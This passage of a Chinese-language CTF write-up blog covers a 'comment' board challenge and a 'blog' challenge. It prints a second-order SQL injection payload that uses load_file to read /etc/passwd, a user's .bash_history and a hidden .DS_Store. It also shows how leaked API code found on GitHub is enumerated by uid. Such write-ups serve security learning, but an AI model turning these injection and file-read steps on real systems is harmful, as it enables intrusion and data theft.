class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>首先我们可以看到题目，当你对某个帖子提交留言的时候，它会把你post过去的content显示出来，然后，我们看代码能否对content进行回显利用。发现这里存在一个二次注入，我们可以把发帖处的category构造为<code>&#39;,content=(select load_file(&#39;/etc/passwd&#39;)),</code>，然后，把留言处的content构造为<code>*/#</code>，这样出来的效果是这样子的<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/72.png" alt="image">，这时候，网页上就会显示出content的内容。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/73.png" alt="image">然后，我尝试了一下读/flag，发现没东西。这时候看到<code>/etc/passwd</code>里面有一个www用户，然后，我们可以读<code>/home/www/.bash_history</code>，看看该用户都干过什么。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/74.png" alt="image">根据他的操作记录，可以知道他在tmp目录解压了html.zip，然后到<code>/var/www/html</code>删掉了<code>.DS_Store</code>，这个<code>.DS_Store</code>应该十分关键，于是，读一下<code>/tmp/html/.DS_Store</code>，直接读是不行的<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/75.png" alt="image">于是，先拿hex编码一下。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/76.png" alt="image">可以看到，有一个<code>flag_8946e1ff1ee3e40f.php</code>，然后同样的读取就可以get flag。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/77.png" alt="image"></p>
+<h2 id="0x10-blog"><a href="#0x10-blog" class="headerlink" title="0x10 blog"></a>0x10 blog</h2><p>题目描述：find the flag.<br>题目给了一个wordpress的站，看了下版本，搜了一下，是最新的，没有可以利用的漏洞<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/65.png" alt="image">but，首页上写着几个大字：’该博客为青龙鼎科技(qinglongdingkeji.com)官方技术博客。于是，可以到github上搜一下这个青龙鼎科技，在code处可以看到搜到了东西<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/66.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/67.png" alt="image">有一个api.php，泄露了api信息，于是尝试遍历一下uid，可以看到，uid=233的时候返回长度是最大的，点开看看，发现就有flag<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/68.png" alt="image"></p>
+
+        
+      </div>
+      
+      
+      
+    </div>
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-fakebook"><span class="nav-number">1.</span> <span class="nav-text">0x00 fakebook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-calc"><span class="nav-number">2.</span> <span class="nav-text">0x01 calc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-wafUpload"><span class="nav-number">3.</span> <span class="nav-text">0x02 wafUpload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-spider"><span class="nav-number">4.</span> <span class="nav-text">0x03 spider</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-comein"><span class="nav-number">5.</span> <span class="nav-text">0x04 comein</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-i-am-admin"><span class="nav-number">6.</span> <span class="nav-text">0x05 i_am_admin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-gold"><span class="nav-number">7.</span> <span class="nav-text">0x06 gold</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-phone"><span class="nav-number">8.</span> <span class="nav-text">0x07 phone</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-mmmmy"><span class="nav-number">9.</span> <span class="nav-text">0x08 mmmmy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-comment"><span class="nav-number">10.</span> <span class="nav-text">0x09 comment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-blog"><span class="nav-number">11.</span> <span class="nav-text">0x10 blog</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
